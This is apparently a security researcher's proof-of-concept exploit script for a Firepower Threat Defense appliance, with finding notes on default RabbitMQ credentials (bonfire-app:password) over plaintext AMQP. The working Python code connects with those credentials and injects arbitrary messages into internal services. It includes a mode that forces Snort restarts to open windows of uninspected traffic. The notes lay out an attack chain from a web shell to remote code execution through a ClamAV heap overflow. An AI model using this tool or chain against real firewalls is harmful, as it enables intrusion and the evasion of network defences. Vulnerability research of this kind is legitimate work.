"""
F-FTD-82: RabbitMQ plaintext AMQP with default Bonfire credentials — IPC message injection
CONTROLLED ENVIRONMENT ONLY

Root cause:
  BonfireService.pm (/usr/local/sf/lib/perl/5.24.4/BonfireService.pm):
    my $PORT  = 5672;              # plaintext AMQP, NOT 5671 SSL
    my $VHOST = '/bonfire';
    $options{username} //= 'bonfire-app';
    $options{password} //= 'password';
    $connection->connect('localhost', { user => ..., password => ..., port => $PORT, vhost => $VHOST })

  rabbitmq.config.tt (template that generates /etc/rabbitmq/rabbitmq.config):
    {ssl_listeners, [5671]},      # SSL listener added
    # NO {tcp_listeners, []}      # plaintext listener NOT DISABLED
    → RabbitMQ listens on BOTH 5671 (SSL) AND 5672 (plaintext TCP)

  DEFAULT CREDENTIALS:
    username: bonfire-app
    password: password
    vhost:    /bonfire
    port:     5672 (plaintext AMQP)

  RabbitMQ exchanges in /bonfire vhost:
    'broadcast'  — fan-out to all broadcast handlers (exchange type: topic)
    'request'    — routed to a single handler (exchange type: direct)

  Queue naming convention (from BonfireService.pm line 373):
    '{type}:{appid}:{routingKey}'
    where type: b=broadcast, r=request, l=local-only request

  Known queues/routes:
    b:SFDataCorrelator-Syslog   — SFDataCorrelator syslog event consumer
    snort.restart.indicator     — Snort restart broadcast (triggers Snort restart handling)
    bonfire-app                 — default appId for connections

ATTACK SURFACE:
  From a www shell (post F-FTD-67 zip-slip or F-FTD-78 HA standby RCE):
    1. Connect to localhost:5672 with bonfire-app:password, vhost /bonfire
    2. Publish to any exchange with any routing key
    3. All Bonfire consumers receive and process the message

  FTD components using BonfireService (will receive injected messages):
    - SFDataCorrelator  — file scanning, AMP events, network correlation
    - Snort event publisher (SF::SnortRestartEvent)
    - SF::Messaging — user notification system
    - SF::Lamplighter — (confirm from Perl module analysis)
    - SF::PeerManager  — FMC peer management
    - Any Perl service using BonfireService.pm

  High-impact injection routes:
    snort.restart.indicator → triggers Snort restart evaluation
    SFDataCorrelator routes → inject malformed event data → ClamAV or
                               parsing bug trigger → escalate to F-FTD-81
    SF::Messaging routes    → inject user notification payloads
                             (potential XSS in FMC UI via injected messages)

CHAIN:
  F-FTD-78 (pre-auth HA standby RCE) → www shell
  OR: F-FTD-79 (admin:Admin123) → F-FTD-67 (zip-slip) → www JSP shell
  → connect localhost:5672/bonfire with bonfire-app:password
  → publish to r:SFDataCorrelator:{route} → inject malformed file event
  → SFDataCorrelator processes event → F-FTD-81 ClamAV heap overflow
  → SFDataCorrelator RCE

  Alternative: inject snort.restart.indicator broadcast → trigger Snort policy
  reload cycle → windows of uninspected traffic

VERIFY (on live FTD, requires www shell):
  # Check RabbitMQ plaintext listener
  ss -tlnp | grep 5672          # should show 5672 listening

  # Verify default credentials work
  rabbitmqadmin -H localhost -u bonfire-app -p password list queues vhost=/bonfire

  # List existing Bonfire queues
  HOME=/etc/rabbitmq rabbitmqctl list_queues -p /bonfire name messages

Affected: FTD 6.7.0-65 (BonfireService.pm confirmed)
Severity: HIGH — any www-level process can inject arbitrary IPC messages to all
          internal FTD services (SFDataCorrelator, Snort, peer manager)
Auth required: www shell (post any FDM → www path: F-FTD-67, F-FTD-78)
"""

# CONTROLLED ENVIRONMENT ONLY

import sys

try:
    import pika
    PIKA_AVAILABLE = True
except ImportError:
    PIKA_AVAILABLE = False

import json


RABBITMQ_HOST    = 'localhost'
RABBITMQ_PORT    = 5672
RABBITMQ_VHOST   = '/bonfire'
RABBITMQ_USER    = 'bonfire-app'
RABBITMQ_PASS    = 'password'

EXCHANGE_BROADCAST = 'broadcast'
EXCHANGE_REQUEST   = 'request'


def bonfire_connect():
    """
    Connect to RabbitMQ on localhost:5672 with default bonfire-app:password creds.
    Returns (connection, channel) or raises on failure.
    CONTROLLED ENVIRONMENT ONLY.
    """
    if not PIKA_AVAILABLE:
        raise ImportError("pika not installed. Install: pip install pika")
    credentials = pika.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)
    params = pika.ConnectionParameters(
        host=RABBITMQ_HOST,
        port=RABBITMQ_PORT,
        virtual_host=RABBITMQ_VHOST,
        credentials=credentials,
        connection_attempts=3,
        retry_delay=2
    )
    conn = pika.BlockingConnection(params)
    ch = conn.channel()
    print(f"[!!!] Connected to RabbitMQ on {RABBITMQ_HOST}:{RABBITMQ_PORT}/bonfire")
    print(f"      Credentials: {RABBITMQ_USER}:{RABBITMQ_PASS}")
    return conn, ch


def probe_bonfire(host=None):
    """
    Verify RabbitMQ is accessible with default creds.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-82: Probing RabbitMQ bonfire-app:password on {RABBITMQ_HOST}:{RABBITMQ_PORT}/bonfire")
    try:
        conn, ch = bonfire_connect()
        print(f"[!!!] DEFAULT CREDENTIALS ACCEPTED: bonfire-app:password")
        print(f"      RabbitMQ /bonfire vhost is accessible without SSL verification")
        conn.close()
        return True
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False


def inject_broadcast(route, payload, headers=None):
    """
    Publish a message to the broadcast exchange with given routing key.
    All FTD Bonfire consumers with matching route will receive this.
    CONTROLLED ENVIRONMENT ONLY.
    """
    conn, ch = bonfire_connect()
    body = json.dumps(payload) if isinstance(payload, (dict, list)) else str(payload)
    content_type = 'application/json' if isinstance(payload, (dict, list)) else 'text/plain'

    props = pika.BasicProperties(
        content_type=content_type,
        headers=headers or {'source': 'attacker', 'node': '127.0.0.1'}
    )
    ch.basic_publish(
        exchange=EXCHANGE_BROADCAST,
        routing_key=route,
        body=body.encode('utf-8'),
        properties=props
    )
    print(f"[!!!] BROADCAST PUBLISHED: exchange=broadcast, route={route}")
    print(f"      Payload ({len(body)} bytes): {body[:200]}")
    conn.close()


def inject_request(route, payload, app_id='attacker', headers=None):
    """
    Publish a message to the request exchange. A single Bonfire consumer will receive it.
    CONTROLLED ENVIRONMENT ONLY.
    """
    conn, ch = bonfire_connect()
    body = json.dumps(payload) if isinstance(payload, (dict, list)) else str(payload)
    content_type = 'application/json' if isinstance(payload, (dict, list)) else 'text/plain'

    props = pika.BasicProperties(
        content_type=content_type,
        headers=headers or {'source': app_id, 'node': '127.0.0.1'}
    )
    ch.basic_publish(
        exchange=EXCHANGE_REQUEST,
        routing_key=route,
        body=body.encode('utf-8'),
        properties=props
    )
    print(f"[!!!] REQUEST PUBLISHED: exchange=request, route={route}")
    print(f"      Payload ({len(body)} bytes): {body[:200]}")
    conn.close()


def trigger_snort_restart():
    """
    Publish snort.restart.indicator broadcast — triggers Snort restart evaluation.
    Impact: windows of uninspected traffic during Snort restart.
    CONTROLLED ENVIRONMENT ONLY.
    """
    payload = {
        'configs': [{'type': 'ATTACKER_INJECT', 'value': 'test'}],
        'operationType': 'EVENT_PERSIST'
    }
    print(f"[*] F-FTD-82: Injecting snort.restart.indicator broadcast")
    inject_broadcast('snort.restart.indicator', payload)


def list_queues():
    """
    Connect and attempt to introspect queue structure.
    CONTROLLED ENVIRONMENT ONLY.
    """
    print(f"[*] F-FTD-82: Listing queues (requires rabbitmqadmin or management API)")
    print(f"    Run: rabbitmqadmin -H localhost -u bonfire-app -p password list queues vhost=/bonfire")
    print(f"    Or: HOME=/etc/rabbitmq rabbitmqctl list_queues -p /bonfire name messages consumers")


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-82: RabbitMQ bonfire-app:password plaintext AMQP IPC injection")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print("""
BonfireService.pm:
  PORT  = 5672     (plaintext, NOT 5671 SSL)
  VHOST = /bonfire
  user  = bonfire-app (default)
  pass  = password    (default)

rabbitmq.config.tt:
  {ssl_listeners, [5671]}  — SSL enabled
  MISSING {tcp_listeners, []}  — plaintext NOT disabled
  → Port 5672 open and accessible

Exchanges:
  broadcast — fan-out to all broadcast handlers
  request   — routed to single handler

Known consumer routes:
  snort.restart.indicator — Snort restart trigger (SF::SnortRestartEvent)
  SFDataCorrelator routes — file/event processing (SFDataCorrelator binary)
  SF::Messaging routes    — user notification injection

Impact:
  www shell → pika.connect(localhost:5672, bonfire-app, password, /bonfire)
  → inject ANY message to ANY Bonfire consumer on FTD
  → trigger Snort restarts, inject malformed events to ClamAV scanner,
    inject notification messages to FMC users
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else "probe"

    if mode == "probe":
        probe_bonfire()

    elif mode == "snort":
        trigger_snort_restart()

    elif mode == "broadcast":
        if len(sys.argv) < 4:
            print(f"Usage: {sys.argv[0]} broadcast <route> <json_payload>")
            sys.exit(1)
        route = sys.argv[2]
        payload = json.loads(sys.argv[3])
        inject_broadcast(route, payload)

    elif mode == "request":
        if len(sys.argv) < 4:
            print(f"Usage: {sys.argv[0]} request <route> <json_payload>")
            sys.exit(1)
        route = sys.argv[2]
        payload = json.loads(sys.argv[3])
        inject_request(route, payload)

    elif mode == "queues":
        list_queues()

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
